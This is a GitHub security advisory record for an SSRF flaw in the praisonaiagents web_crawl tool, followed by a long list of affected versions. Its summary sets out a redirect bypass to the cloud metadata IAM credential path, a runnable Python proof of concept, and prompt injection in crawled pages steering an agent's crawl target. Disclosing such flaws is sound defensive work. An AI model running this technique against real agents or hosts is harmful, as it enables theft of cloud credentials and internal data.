@@ -1,0 +1,687 @@
+advisory_id: GHSA-5r34-2g38-6569
+datasource_id: github_osv/GHSA-5r34-2g38-6569
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-5r34-2g38-6569/GHSA-5r34-2g38-6569.json
+aliases:
+  - CVE-2026-55525
+summary: "praisonaiagents web_crawl vulnerable to SSRF via redirect-following\n### Summary\n\
+  `web_crawl` (an exported, model-callable tool) validates only the INITIAL URL's resolved IP\
+  \ against a private/loopback blocklist, then fetches with `httpx.Client(follow_redirects=True)`\
+  \ and never re-validates redirect targets. \n\nAn attacker who controls the agent's crawl\
+  \ target (a malicious task, or prompt injection inside any page the agent already crawls)\
+  \ supplies a public URL that HTTP 302-redirects to an internal address. httpx follows the\
+  \ redirect, fetches the internal resource (cloud metadata `169.254.169.254`, localhost services,\
+  \ internal APIs), and returns its body into the agent context. This bypasses the SSRF protection\
+  \ added to fix the earlier web_crawl SSRF reports, so it is an incomplete fix for that class.\
+  \ httpx is the default crawl provider on a stock `pip install praisonaiagents`, so no provider\
+  \ configuration is required.\n\n\n### Details\n\n1. The agent is asked (or prompt-injected)\
+  \ to crawl `https://attacker.example/r`, which the source accepts because `attacker.example`\
+  \ resolves to a public IP.\n2. The attacker server responds 302 Location: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`.\
+  \ \n3. `_crawl_with_httpx` follows the redirect with `follow_redirects=True`, fetches the\
+  \ IAM credential document, and `web_crawl` returns it in the result content field, where it\
+  \ enters the agent context and any downstream tool, log, or model response. \n\nThe same technique\
+  \ reaches `http://127.0.0.1:<port>/` internal services and other link-local and RFC1918 hosts\n\
+  \n**Source (validates only the initial hostname)**\n```python\n# src/praisonai-agents/praisonaiagents/tools/web_crawl_tools.py:231\n\
+  \nip_str = socket.gethostbyname(hostname)\nip = ipaddress.ip_address(ip_str)\nif ip.is_loopback\
+  \ or ip.is_private or ip.is_link_local or ip.is_multicast or ip.is_unspecified:\n    logger.warning(f\"\
+  Rejected SSRF or private IP attempt: {u}\")\n    continue\n```\n\n\n**Sink (follows redirects\
+  \ with no re-validation)**\n```python\n# src/praisonai-agents/praisonaiagents/tools/web_crawl_tools.py:142\n\
+  \nimport httpx\nwith httpx.Client(follow_redirects=True, timeout=30.0) as client:\n      \
+  \ response = client.get(url)\n       response.raise_for_status()\n       content = response.text\n\
+  ```\n\n### PoC\nDependencies: `pip install praisonaiagents==1.6.52` `httpx`\n\nPreconditions:\n\
+  - The agent has the `web_crawl` tool registered, which is a standard exported tool. \n- The\
+  \ default crawl provider `httpx` is selected (it is always available and is available[0] when\
+  \ Tavily/Crawl4AI are not installed, the default install). \n- `ALLOW_LOCAL_CRAWL` is not\
+  \ set to true (default), so the source front-door is active and the redirect path is the load-bearing\
+  \ bypass. \n- The crawl target is influenced by the model (a task instruction or prompt injection\
+  \ in previously fetched content).\n\n```python\n\"\"\"Direct loopback is blocked; a public\
+  \ redirector to loopback is not.\"\"\"\nimport http.server, json, socket, threading, urllib.parse\n\
+  from praisonaiagents.tools import web_crawl\n\nSECRET = \"INTERNAL-ONLY-IAM-CREDENTIAL-zzz\"\
+  \n\nclass H(http.server.BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200);\
+  \ self.end_headers(); self.wfile.write(SECRET.encode())\n    def log_message(self, *a): pass\n\
+  \ns = socket.socket(); s.bind((\"127.0.0.1\", 0)); port = s.getsockname()[1]; s.close()\n\
+  srv = http.server.HTTPServer((\"127.0.0.1\", port), H)\nthreading.Thread(target=srv.serve_forever,\
+  \ daemon=True).start()\ninternal = f\"http://127.0.0.1:{port}/latest/meta-data/iam/security-credentials/\"\
+  \n\ncontrol = web_crawl(internal)                       # front-door blocks loopback\nleaked\
+  \ = lambda r: SECRET in json.dumps(r)\nredirector = \"https://httpbin.org/redirect-to?\" +\
+  \ urllib.parse.urlencode(\n    {\"url\": internal, \"status_code\": \"302\"})        # public\
+  \ host -> 302 -> internal\nexploit = web_crawl(redirector)\nsrv.shutdown()\nprint(\"control_leaked\"\
+  , leaked(control), \"| exploit_leaked\", leaked(exploit))\nassert not leaked(control) and\
+  \ leaked(exploit)\nprint(\"CONFIRMED: internal secret exfiltrated via redirect, front-door\
+  \ bypassed\")\n```\n\n### Impact\nAny attacker who can influence an agent's crawl target (a\
+  \ crafted task, or prompt injection in any page the agent crawls) reads internal-only resources\
+  \ through the agent. On a cloud host this discloses the instance metadata service IAM credentials,\
+  \ giving the attacker the agent host's cloud role; it also reaches localhost admin services\
+  \ and internal APIs. The fetched body is returned into the agent context, so it is exposed\
+  \ to the model, logs, and downstream tools. The SSRF protection that the earlier web_crawl\
+  \ advisories added is fully enabled and still bypassed."
+impacted_packages:
+  - purl: pkg:github/mervinpraison/praisonai
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/mervinpraison/praisonai
+        commit: 2f9677abb2ea68eab864ee8b6a828fd0141612e1
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:pypi/praisonaiagents
+    affected_versions: vers:pypi/<1.6.58
+    fixed_versions: vers:pypi/1.6.58
+    affected_packages:
+      - pkg:pypi/praisonaiagents@0.0.1
+      - pkg:pypi/praisonaiagents@0.0.2
+      - pkg:pypi/praisonaiagents@0.0.3
+      - pkg:pypi/praisonaiagents@0.0.4
+      - pkg:pypi/praisonaiagents@0.0.5
+      - pkg:pypi/praisonaiagents@0.0.6
+      - pkg:pypi/praisonaiagents@0.0.7
+      - pkg:pypi/praisonaiagents@0.0.8
+      - pkg:pypi/praisonaiagents@0.0.9
+      - pkg:pypi/praisonaiagents@0.0.10
+      - pkg:pypi/praisonaiagents@0.0.11
+      - pkg:pypi/praisonaiagents@0.0.12
+      - pkg:pypi/praisonaiagents@0.0.13
+      - pkg:pypi/praisonaiagents@0.0.14
+      - pkg:pypi/praisonaiagents@0.0.15
+      - pkg:pypi/praisonaiagents@0.0.16
+      - pkg:pypi/praisonaiagents@0.0.17
+      - pkg:pypi/praisonaiagents@0.0.18
+      - pkg:pypi/praisonaiagents@0.0.19
+      - pkg:pypi/praisonaiagents@0.0.20
+      - pkg:pypi/praisonaiagents@0.0.21
+      - pkg:pypi/praisonaiagents@0.0.22
+      - pkg:pypi/praisonaiagents@0.0.23
+      - pkg:pypi/praisonaiagents@0.0.24
+      - pkg:pypi/praisonaiagents@0.0.25
+      - pkg:pypi/praisonaiagents@0.0.26
+      - pkg:pypi/praisonaiagents@0.0.27
+      - pkg:pypi/praisonaiagents@0.0.28
+      - pkg:pypi/praisonaiagents@0.0.29
+      - pkg:pypi/praisonaiagents@0.0.30
+      - pkg:pypi/praisonaiagents@0.0.31
+      - pkg:pypi/praisonaiagents@0.0.32
+      - pkg:pypi/praisonaiagents@0.0.33
+      - pkg:pypi/praisonaiagents@0.0.34
+      - pkg:pypi/praisonaiagents@0.0.35
+      - pkg:pypi/praisonaiagents@0.0.36
+      - pkg:pypi/praisonaiagents@0.0.37
+      - pkg:pypi/praisonaiagents@0.0.38
+      - pkg:pypi/praisonaiagents@0.0.39
+      - pkg:pypi/praisonaiagents@0.0.40
+      - pkg:pypi/praisonaiagents@0.0.41
+      - pkg:pypi/praisonaiagents@0.0.42
+      - pkg:pypi/praisonaiagents@0.0.43
+      - pkg:pypi/praisonaiagents@0.0.44
+      - pkg:pypi/praisonaiagents@0.0.45
+      - pkg:pypi/praisonaiagents@0.0.46
+      - pkg:pypi/praisonaiagents@0.0.47
+      - pkg:pypi/praisonaiagents@0.0.48
+      - pkg:pypi/praisonaiagents@0.0.49
+      - pkg:pypi/praisonaiagents@0.0.50
+      - pkg:pypi/praisonaiagents@0.0.51
+      - pkg:pypi/praisonaiagents@0.0.52
+      - pkg:pypi/praisonaiagents@0.0.53
+      - pkg:pypi/praisonaiagents@0.0.54
+      - pkg:pypi/praisonaiagents@0.0.56
+      - pkg:pypi/praisonaiagents@0.0.57
+      - pkg:pypi/praisonaiagents@0.0.58
+      - pkg:pypi/praisonaiagents@0.0.59
+      - pkg:pypi/praisonaiagents@0.0.60
+      - pkg:pypi/praisonaiagents@0.0.61
+      - pkg:pypi/praisonaiagents@0.0.62
+      - pkg:pypi/praisonaiagents@0.0.63
+      - pkg:pypi/praisonaiagents@0.0.64
+      - pkg:pypi/praisonaiagents@0.0.65
+      - pkg:pypi/praisonaiagents@0.0.66
+      - pkg:pypi/praisonaiagents@0.0.67
+      - pkg:pypi/praisonaiagents@0.0.68
+      - pkg:pypi/praisonaiagents@0.0.69
+      - pkg:pypi/praisonaiagents@0.0.70
+      - pkg:pypi/praisonaiagents@0.0.71
+      - pkg:pypi/praisonaiagents@0.0.72
+      - pkg:pypi/praisonaiagents@0.0.73
+      - pkg:pypi/praisonaiagents@0.0.74
+      - pkg:pypi/praisonaiagents@0.0.75
+      - pkg:pypi/praisonaiagents@0.0.76
+      - pkg:pypi/praisonaiagents@0.0.77
+      - pkg:pypi/praisonaiagents@0.0.78
+      - pkg:pypi/praisonaiagents@0.0.79
+      - pkg:pypi/praisonaiagents@0.0.80
+      - pkg:pypi/praisonaiagents@0.0.81
+      - pkg:pypi/praisonaiagents@0.0.82
+      - pkg:pypi/praisonaiagents@0.0.83
+      - pkg:pypi/praisonaiagents@0.0.84
+      - pkg:pypi/praisonaiagents@0.0.85
+      - pkg:pypi/praisonaiagents@0.0.86
+      - pkg:pypi/praisonaiagents@0.0.87
+      - pkg:pypi/praisonaiagents@0.0.88
+      - pkg:pypi/praisonaiagents@0.0.89
+      - pkg:pypi/praisonaiagents@0.0.90
+      - pkg:pypi/praisonaiagents@0.0.91
+      - pkg:pypi/praisonaiagents@0.0.92
+      - pkg:pypi/praisonaiagents@0.0.93
+      - pkg:pypi/praisonaiagents@0.0.94
+      - pkg:pypi/praisonaiagents@0.0.95
+      - pkg:pypi/praisonaiagents@0.0.96
+      - pkg:pypi/praisonaiagents@0.0.97
+      - pkg:pypi/praisonaiagents@0.0.98
+      - pkg:pypi/praisonaiagents@0.0.99
+      - pkg:pypi/praisonaiagents@0.0.100
+      - pkg:pypi/praisonaiagents@0.0.101
+      - pkg:pypi/praisonaiagents@0.0.102
+      - pkg:pypi/praisonaiagents@0.0.103
+      - pkg:pypi/praisonaiagents@0.0.104
+      - pkg:pypi/praisonaiagents@0.0.105
+      - pkg:pypi/praisonaiagents@0.0.106
+      - pkg:pypi/praisonaiagents@0.0.107
+      - pkg:pypi/praisonaiagents@0.0.108
+      - pkg:pypi/praisonaiagents@0.0.109
+      - pkg:pypi/praisonaiagents@0.0.110
+      - pkg:pypi/praisonaiagents@0.0.111
+      - pkg:pypi/praisonaiagents@0.0.112
+      - pkg:pypi/praisonaiagents@0.0.113
+      - pkg:pypi/praisonaiagents@0.0.114
+      - pkg:pypi/praisonaiagents@0.0.115
+      - pkg:pypi/praisonaiagents@0.0.116
+      - pkg:pypi/praisonaiagents@0.0.117
+      - pkg:pypi/praisonaiagents@0.0.118
+      - pkg:pypi/praisonaiagents@0.0.119
+      - pkg:pypi/praisonaiagents@0.0.120
+      - pkg:pypi/praisonaiagents@0.0.121
+      - pkg:pypi/praisonaiagents@0.0.122
+      - pkg:pypi/praisonaiagents@0.0.123
+      - pkg:pypi/praisonaiagents@0.0.124
+      - pkg:pypi/praisonaiagents@0.0.125
+      - pkg:pypi/praisonaiagents@0.0.126
+      - pkg:pypi/praisonaiagents@0.0.127
+      - pkg:pypi/praisonaiagents@0.0.128
+      - pkg:pypi/praisonaiagents@0.0.129
+      - pkg:pypi/praisonaiagents@0.0.130
+      - pkg:pypi/praisonaiagents@0.0.131
+      - pkg:pypi/praisonaiagents@0.0.132
+      - pkg:pypi/praisonaiagents@0.0.133
+      - pkg:pypi/praisonaiagents@0.0.134
+      - pkg:pypi/praisonaiagents@0.0.135
+      - pkg:pypi/praisonaiagents@0.0.136
+      - pkg:pypi/praisonaiagents@0.0.137
+      - pkg:pypi/praisonaiagents@0.0.138
+      - pkg:pypi/praisonaiagents@0.0.139
+      - pkg:pypi/praisonaiagents@0.0.140
+      - pkg:pypi/praisonaiagents@0.0.141
+      - pkg:pypi/praisonaiagents@0.0.142
+      - pkg:pypi/praisonaiagents@0.0.143
+      - pkg:pypi/praisonaiagents@0.0.144
+      - pkg:pypi/praisonaiagents@0.0.145
+      - pkg:pypi/praisonaiagents@0.0.146
+      - pkg:pypi/praisonaiagents@0.0.147
+      - pkg:pypi/praisonaiagents@0.0.148
+      - pkg:pypi/praisonaiagents@0.0.149
+      - pkg:pypi/praisonaiagents@0.0.150
+      - pkg:pypi/praisonaiagents@0.0.151
+      - pkg:pypi/praisonaiagents@0.0.152
+      - pkg:pypi/praisonaiagents@0.0.153
+      - pkg:pypi/praisonaiagents@0.0.154
+      - pkg:pypi/praisonaiagents@0.0.155
+      - pkg:pypi/praisonaiagents@0.0.156
+      - pkg:pypi/praisonaiagents@0.0.157
+      - pkg:pypi/praisonaiagents@0.0.158
+      - pkg:pypi/praisonaiagents@0.0.159
+      - pkg:pypi/praisonaiagents@0.0.160
+      - pkg:pypi/praisonaiagents@0.0.161
+      - pkg:pypi/praisonaiagents@0.0.162
+      - pkg:pypi/praisonaiagents@0.0.163
+      - pkg:pypi/praisonaiagents@0.0.164
+      - pkg:pypi/praisonaiagents@0.0.165
+      - pkg:pypi/praisonaiagents@0.0.166
+      - pkg:pypi/praisonaiagents@0.0.167
+      - pkg:pypi/praisonaiagents@0.0.168
+      - pkg:pypi/praisonaiagents@0.0.169
+      - pkg:pypi/praisonaiagents@0.0.170
+      - pkg:pypi/praisonaiagents@0.0.171
+      - pkg:pypi/praisonaiagents@0.0.172
+      - pkg:pypi/praisonaiagents@0.0.173
+      - pkg:pypi/praisonaiagents@0.0.174
+      - pkg:pypi/praisonaiagents@0.0.175
+      - pkg:pypi/praisonaiagents@0.0.176
+      - pkg:pypi/praisonaiagents@0.0.177
+      - pkg:pypi/praisonaiagents@0.0.178
+      - pkg:pypi/praisonaiagents@0.0.179
+      - pkg:pypi/praisonaiagents@0.0.180
+      - pkg:pypi/praisonaiagents@0.0.181
+      - pkg:pypi/praisonaiagents@0.0.182
+      - pkg:pypi/praisonaiagents@0.0.183
+      - pkg:pypi/praisonaiagents@0.0.184
+      - pkg:pypi/praisonaiagents@0.0.185
+      - pkg:pypi/praisonaiagents@0.0.187
+      - pkg:pypi/praisonaiagents@0.0.188
+      - pkg:pypi/praisonaiagents@0.0.189
+      - pkg:pypi/praisonaiagents@0.0.190
+      - pkg:pypi/praisonaiagents@0.0.191
+      - pkg:pypi/praisonaiagents@0.0.192
+      - pkg:pypi/praisonaiagents@0.0.193
+      - pkg:pypi/praisonaiagents@0.0.194
+      - pkg:pypi/praisonaiagents@0.0.195
+      - pkg:pypi/praisonaiagents@0.0.196
+      - pkg:pypi/praisonaiagents@0.0.197
+      - pkg:pypi/praisonaiagents@0.0.198
+      - pkg:pypi/praisonaiagents@0.0.199
+      - pkg:pypi/praisonaiagents@0.1.0
+      - pkg:pypi/praisonaiagents@0.1.1
+      - pkg:pypi/praisonaiagents@0.1.2
+      - pkg:pypi/praisonaiagents@0.1.3
+      - pkg:pypi/praisonaiagents@0.1.4
+      - pkg:pypi/praisonaiagents@0.1.5
+      - pkg:pypi/praisonaiagents@0.1.6
+      - pkg:pypi/praisonaiagents@0.1.7
+      - pkg:pypi/praisonaiagents@0.1.8
+      - pkg:pypi/praisonaiagents@0.1.9
+      - pkg:pypi/praisonaiagents@0.1.10
+      - pkg:pypi/praisonaiagents@0.1.11
+      - pkg:pypi/praisonaiagents@0.1.12
+      - pkg:pypi/praisonaiagents@0.1.13
+      - pkg:pypi/praisonaiagents@0.1.14
+      - pkg:pypi/praisonaiagents@0.1.15
+      - pkg:pypi/praisonaiagents@0.1.16
+      - pkg:pypi/praisonaiagents@0.1.17
+      - pkg:pypi/praisonaiagents@0.1.18
+      - pkg:pypi/praisonaiagents@0.1.19
+      - pkg:pypi/praisonaiagents@0.1.20
+      - pkg:pypi/praisonaiagents@0.1.21
+      - pkg:pypi/praisonaiagents@0.1.22
+      - pkg:pypi/praisonaiagents@0.1.23
+      - pkg:pypi/praisonaiagents@0.1.24
+      - pkg:pypi/praisonaiagents@0.1.25
+      - pkg:pypi/praisonaiagents@0.1.26
+      - pkg:pypi/praisonaiagents@0.1.27
+      - pkg:pypi/praisonaiagents@0.2.0
+      - pkg:pypi/praisonaiagents@0.2.1
+      - pkg:pypi/praisonaiagents@0.2.2
+      - pkg:pypi/praisonaiagents@0.3.0
+      - pkg:pypi/praisonaiagents@0.3.1
+      - pkg:pypi/praisonaiagents@0.3.2
+      - pkg:pypi/praisonaiagents@0.3.3
+      - pkg:pypi/praisonaiagents@0.3.4
+      - pkg:pypi/praisonaiagents@0.4.0
+      - pkg:pypi/praisonaiagents@0.4.1
+      - pkg:pypi/praisonaiagents@0.5.0
+      - pkg:pypi/praisonaiagents@0.5.1
+      - pkg:pypi/praisonaiagents@0.5.2
+      - pkg:pypi/praisonaiagents@0.5.3
+      - pkg:pypi/praisonaiagents@0.6.0
+      - pkg:pypi/praisonaiagents@0.6.1
+      - pkg:pypi/praisonaiagents@0.6.2
+      - pkg:pypi/praisonaiagents@0.6.3
+      - pkg:pypi/praisonaiagents@0.6.4
+      - pkg:pypi/praisonaiagents@0.6.5
+      - pkg:pypi/praisonaiagents@0.6.6
+      - pkg:pypi/praisonaiagents@0.6.7
+      - pkg:pypi/praisonaiagents@0.6.8
+      - pkg:pypi/praisonaiagents@0.7.0
+      - pkg:pypi/praisonaiagents@0.7.1
+      - pkg:pypi/praisonaiagents@0.8.0
+      - pkg:pypi/praisonaiagents@0.8.1
+      - pkg:pypi/praisonaiagents@0.9.0
+      - pkg:pypi/praisonaiagents@0.9.1
+      - pkg:pypi/praisonaiagents@0.10.0
+      - pkg:pypi/praisonaiagents@0.10.1
+      - pkg:pypi/praisonaiagents@0.10.2
+      - pkg:pypi/praisonaiagents@0.10.3
+      - pkg:pypi/praisonaiagents@0.10.4
+      - pkg:pypi/praisonaiagents@0.10.5
+      - pkg:pypi/praisonaiagents@0.10.6
+      - pkg:pypi/praisonaiagents@0.10.7
+      - pkg:pypi/praisonaiagents@0.10.8
+      - pkg:pypi/praisonaiagents@0.10.9
+      - pkg:pypi/praisonaiagents@0.10.10
+      - pkg:pypi/praisonaiagents@0.11.0
+      - pkg:pypi/praisonaiagents@0.11.1
+      - pkg:pypi/praisonaiagents@0.11.2
+      - pkg:pypi/praisonaiagents@0.11.3
+      - pkg:pypi/praisonaiagents@0.11.4
+      - pkg:pypi/praisonaiagents@0.11.5
+      - pkg:pypi/praisonaiagents@0.11.6
+      - pkg:pypi/praisonaiagents@0.11.7
+      - pkg:pypi/praisonaiagents@0.11.8
+      - pkg:pypi/praisonaiagents@0.11.9
+      - pkg:pypi/praisonaiagents@0.11.10
+      - pkg:pypi/praisonaiagents@0.11.11
+      - pkg:pypi/praisonaiagents@0.11.12
+      - pkg:pypi/praisonaiagents@0.11.13
+      - pkg:pypi/praisonaiagents@0.11.14
+      - pkg:pypi/praisonaiagents@0.11.15
+      - pkg:pypi/praisonaiagents@0.11.16
+      - pkg:pypi/praisonaiagents@0.11.17
+      - pkg:pypi/praisonaiagents@0.11.18
+      - pkg:pypi/praisonaiagents@0.11.19
+      - pkg:pypi/praisonaiagents@0.11.20
+      - pkg:pypi/praisonaiagents@0.11.21
+      - pkg:pypi/praisonaiagents@0.11.22
+      - pkg:pypi/praisonaiagents@0.11.23
+      - pkg:pypi/praisonaiagents@0.11.24
+      - pkg:pypi/praisonaiagents@0.11.25
+      - pkg:pypi/praisonaiagents@0.11.27
+      - pkg:pypi/praisonaiagents@0.11.28
+      - pkg:pypi/praisonaiagents@0.11.29
+      - pkg:pypi/praisonaiagents@0.11.30
+      - pkg:pypi/praisonaiagents@0.11.31
+      - pkg:pypi/praisonaiagents@0.12.0
+      - pkg:pypi/praisonaiagents@0.12.1
+      - pkg:pypi/praisonaiagents@0.12.2
+      - pkg:pypi/praisonaiagents@0.12.3
+      - pkg:pypi/praisonaiagents@0.12.4
+      - pkg:pypi/praisonaiagents@0.12.5
+      - pkg:pypi/praisonaiagents@0.12.6
+      - pkg:pypi/praisonaiagents@0.12.7
+      - pkg:pypi/praisonaiagents@0.12.8
+      - pkg:pypi/praisonaiagents@0.12.9
+      - pkg:pypi/praisonaiagents@0.12.10
+      - pkg:pypi/praisonaiagents@0.12.11
+      - pkg:pypi/praisonaiagents@0.12.12
+      - pkg:pypi/praisonaiagents@0.12.13
+      - pkg:pypi/praisonaiagents@0.12.14
+      - pkg:pypi/praisonaiagents@0.12.15
+      - pkg:pypi/praisonaiagents@0.12.16
+      - pkg:pypi/praisonaiagents@0.12.17
+      - pkg:pypi/praisonaiagents@0.12.18
+      - pkg:pypi/praisonaiagents@0.12.19
+      - pkg:pypi/praisonaiagents@0.12.20
+      - pkg:pypi/praisonaiagents@0.12.21
+      - pkg:pypi/praisonaiagents@0.13.0
+      - pkg:pypi/praisonaiagents@0.13.1
+      - pkg:pypi/praisonaiagents@0.13.2
+      - pkg:pypi/praisonaiagents@0.13.3
+      - pkg:pypi/praisonaiagents@0.13.4
+      - pkg:pypi/praisonaiagents@0.13.5
+      - pkg:pypi/praisonaiagents@0.13.6
+      - pkg:pypi/praisonaiagents@0.13.7
+      - pkg:pypi/praisonaiagents@0.13.8
+      - pkg:pypi/praisonaiagents@0.13.9
+      - pkg:pypi/praisonaiagents@0.13.10
+      - pkg:pypi/praisonaiagents@0.13.11
+      - pkg:pypi/praisonaiagents@0.13.12
+      - pkg:pypi/praisonaiagents@0.13.13
+      - pkg:pypi/praisonaiagents@0.13.14
+      - pkg:pypi/praisonaiagents@0.13.15
+      - pkg:pypi/praisonaiagents@0.13.16
+      - pkg:pypi/praisonaiagents@0.13.17
+      - pkg:pypi/praisonaiagents@0.13.18
+      - pkg:pypi/praisonaiagents@0.13.19
+      - pkg:pypi/praisonaiagents@0.13.20
+      - pkg:pypi/praisonaiagents@0.13.21
+      - pkg:pypi/praisonaiagents@0.13.22
+      - pkg:pypi/praisonaiagents@0.13.23
+      - pkg:pypi/praisonaiagents@0.14.0
+      - pkg:pypi/praisonaiagents@0.14.1
+      - pkg:pypi/praisonaiagents@0.14.2
+      - pkg:pypi/praisonaiagents@0.14.3
+      - pkg:pypi/praisonaiagents@0.14.4
+      - pkg:pypi/praisonaiagents@0.14.5
+      - pkg:pypi/praisonaiagents@0.14.6
+      - pkg:pypi/praisonaiagents@0.14.7
+      - pkg:pypi/praisonaiagents@0.14.8
+      - pkg:pypi/praisonaiagents@0.14.9
+      - pkg:pypi/praisonaiagents@0.14.10
+      - pkg:pypi/praisonaiagents@0.14.11
+      - pkg:pypi/praisonaiagents@0.14.12
+      - pkg:pypi/praisonaiagents@0.14.14
+      - pkg:pypi/praisonaiagents@0.14.15
+      - pkg:pypi/praisonaiagents@0.14.16
+      - pkg:pypi/praisonaiagents@0.15.0
+      - pkg:pypi/praisonaiagents@0.15.1
+      - pkg:pypi/praisonaiagents@0.15.2
+      - pkg:pypi/praisonaiagents@0.15.3
+      - pkg:pypi/praisonaiagents@1.0.0
+      - pkg:pypi/praisonaiagents@1.1.0
+      - pkg:pypi/praisonaiagents@1.2.0
+      - pkg:pypi/praisonaiagents@1.2.1
+      - pkg:pypi/praisonaiagents@1.2.2
+      - pkg:pypi/praisonaiagents@1.2.3
+      - pkg:pypi/praisonaiagents@1.2.4
+      - pkg:pypi/praisonaiagents@1.3.0
+      - pkg:pypi/praisonaiagents@1.3.1
+      - pkg:pypi/praisonaiagents@1.4.0
+      - pkg:pypi/praisonaiagents@1.4.1
+      - pkg:pypi/praisonaiagents@1.4.2
+      - pkg:pypi/praisonaiagents@1.4.3
+      - pkg:pypi/praisonaiagents@1.4.4
+      - pkg:pypi/praisonaiagents@1.4.5
+      - pkg:pypi/praisonaiagents@1.4.6
+      - pkg:pypi/praisonaiagents@1.4.7
+      - pkg:pypi/praisonaiagents@1.4.8
+      - pkg:pypi/praisonaiagents@1.5.0
+      - pkg:pypi/praisonaiagents@1.5.1
+      - pkg:pypi/praisonaiagents@1.5.2
+      - pkg:pypi/praisonaiagents@1.5.3
+      - pkg:pypi/praisonaiagents@1.5.5
+      - pkg:pypi/praisonaiagents@1.5.6
+      - pkg:pypi/praisonaiagents@1.5.7
+      - pkg:pypi/praisonaiagents@1.5.8
+      - pkg:pypi/praisonaiagents@1.5.9
+      - pkg:pypi/praisonaiagents@1.5.10
+      - pkg:pypi/praisonaiagents@1.5.11
+      - pkg:pypi/praisonaiagents@1.5.12
+      - pkg:pypi/praisonaiagents@1.5.13
+      - pkg:pypi/praisonaiagents@1.5.14
+      - pkg:pypi/praisonaiagents@1.5.15
+      - pkg:pypi/praisonaiagents@1.5.16
+      - pkg:pypi/praisonaiagents@1.5.17
+      - pkg:pypi/praisonaiagents@1.5.18
+      - pkg:pypi/praisonaiagents@1.5.19
+      - pkg:pypi/praisonaiagents@1.5.20
+      - pkg:pypi/praisonaiagents@1.5.21
+      - pkg:pypi/praisonaiagents@1.5.22
+      - pkg:pypi/praisonaiagents@1.5.23
+      - pkg:pypi/praisonaiagents@1.5.24
+      - pkg:pypi/praisonaiagents@1.5.25
+      - pkg:pypi/praisonaiagents@1.5.26
+      - pkg:pypi/praisonaiagents@1.5.27
+      - pkg:pypi/praisonaiagents@1.5.28
+      - pkg:pypi/praisonaiagents@1.5.29
+      - pkg:pypi/praisonaiagents@1.5.30
+      - pkg:pypi/praisonaiagents@1.5.31
+      - pkg:pypi/praisonaiagents@1.5.32
+      - pkg:pypi/praisonaiagents@1.5.33
+      - pkg:pypi/praisonaiagents@1.5.34
+      - pkg:pypi/praisonaiagents@1.5.35
+      - pkg:pypi/praisonaiagents@1.5.36
+      - pkg:pypi/praisonaiagents@1.5.37
+      - pkg:pypi/praisonaiagents@1.5.38
+      - pkg:pypi/praisonaiagents@1.5.39
+      - pkg:pypi/praisonaiagents@1.5.40
+      - pkg:pypi/praisonaiagents@1.5.41
+      - pkg:pypi/praisonaiagents@1.5.42
+      - pkg:pypi/praisonaiagents@1.5.43
+      - pkg:pypi/praisonaiagents@1.5.44
+      - pkg:pypi/praisonaiagents@1.5.45
+      - pkg:pypi/praisonaiagents@1.5.46
+      - pkg:pypi/praisonaiagents@1.5.47
+      - pkg:pypi/praisonaiagents@1.5.48
+      - pkg:pypi/praisonaiagents@1.5.49
+      - pkg:pypi/praisonaiagents@1.5.50
+      - pkg:pypi/praisonaiagents@1.5.51
+      - pkg:pypi/praisonaiagents@1.5.52
+      - pkg:pypi/praisonaiagents@1.5.53
+      - pkg:pypi/praisonaiagents@1.5.54
+      - pkg:pypi/praisonaiagents@1.5.55
+      - pkg:pypi/praisonaiagents@1.5.56
+      - pkg:pypi/praisonaiagents@1.5.57
+      - pkg:pypi/praisonaiagents@1.5.58
+      - pkg:pypi/praisonaiagents@1.5.59
+      - pkg:pypi/praisonaiagents@1.5.60
+      - pkg:pypi/praisonaiagents@1.5.61
+      - pkg:pypi/praisonaiagents@1.5.62
+      - pkg:pypi/praisonaiagents@1.5.63
+      - pkg:pypi/praisonaiagents@1.5.64
+      - pkg:pypi/praisonaiagents@1.5.65
+      - pkg:pypi/praisonaiagents@1.5.66
+      - pkg:pypi/praisonaiagents@1.5.67
+      - pkg:pypi/praisonaiagents@1.5.68
+      - pkg:pypi/praisonaiagents@1.5.69
+      - pkg:pypi/praisonaiagents@1.5.70
+      - pkg:pypi/praisonaiagents@1.5.71
+      - pkg:pypi/praisonaiagents@1.5.72
+      - pkg:pypi/praisonaiagents@1.5.73
+      - pkg:pypi/praisonaiagents@1.5.74
+      - pkg:pypi/praisonaiagents@1.5.75
+      - pkg:pypi/praisonaiagents@1.5.76
+      - pkg:pypi/praisonaiagents@1.5.77
+      - pkg:pypi/praisonaiagents@1.5.78
+      - pkg:pypi/praisonaiagents@1.5.79
+      - pkg:pypi/praisonaiagents@1.5.80
+      - pkg:pypi/praisonaiagents@1.5.81
+      - pkg:pypi/praisonaiagents@1.5.82
+      - pkg:pypi/praisonaiagents@1.5.83
+      - pkg:pypi/praisonaiagents@1.5.84
+      - pkg:pypi/praisonaiagents@1.5.85
+      - pkg:pypi/praisonaiagents@1.5.86
+      - pkg:pypi/praisonaiagents@1.5.87
+      - pkg:pypi/praisonaiagents@1.5.88
+      - pkg:pypi/praisonaiagents@1.5.89
+      - pkg:pypi/praisonaiagents@1.5.90
+      - pkg:pypi/praisonaiagents@1.5.91
+      - pkg:pypi/praisonaiagents@1.5.92
+      - pkg:pypi/praisonaiagents@1.5.93
+      - pkg:pypi/praisonaiagents@1.5.94
+      - pkg:pypi/praisonaiagents@1.5.95
+      - pkg:pypi/praisonaiagents@1.5.96
+      - pkg:pypi/praisonaiagents@1.5.97
+      - pkg:pypi/praisonaiagents@1.5.98
+      - pkg:pypi/praisonaiagents@1.5.99
+      - pkg:pypi/praisonaiagents@1.5.100
+      - pkg:pypi/praisonaiagents@1.5.101
+      - pkg:pypi/praisonaiagents@1.5.102
+      - pkg:pypi/praisonaiagents@1.5.103
+      - pkg:pypi/praisonaiagents@1.5.104
+      - pkg:pypi/praisonaiagents@1.5.105
+      - pkg:pypi/praisonaiagents@1.5.106
+      - pkg:pypi/praisonaiagents@1.5.107
+      - pkg:pypi/praisonaiagents@1.5.108
+      - pkg:pypi/praisonaiagents@1.5.109
+      - pkg:pypi/praisonaiagents@1.5.110
+      - pkg:pypi/praisonaiagents@1.5.111
+      - pkg:pypi/praisonaiagents@1.5.112
+      - pkg:pypi/praisonaiagents@1.5.113
+      - pkg:pypi/praisonaiagents@1.5.114
+      - pkg:pypi/praisonaiagents@1.5.115
